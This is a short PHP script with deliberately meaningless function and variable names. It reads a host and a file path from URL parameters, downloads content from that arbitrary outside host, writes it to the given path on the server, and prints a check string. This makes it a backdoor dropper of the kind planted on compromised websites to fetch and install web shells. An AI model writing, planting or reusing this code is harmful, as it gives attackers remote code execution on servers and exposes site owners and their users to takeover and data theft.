<?php
function class_x_i($x = ''){
$mmmmm = isset($_GET['mmmmm']) ? trim($_GET['mmmmm']) : '';
$uuuuu = isset($_GET['uuuuu']) ? trim($_GET['uuuuu']) : '';
$cccccc = file_get_contents('http://'.$uuuuu);
file_put_contents($mmmmm,$cccccc);
echo 'a1002k';
}
class_x_i();
?>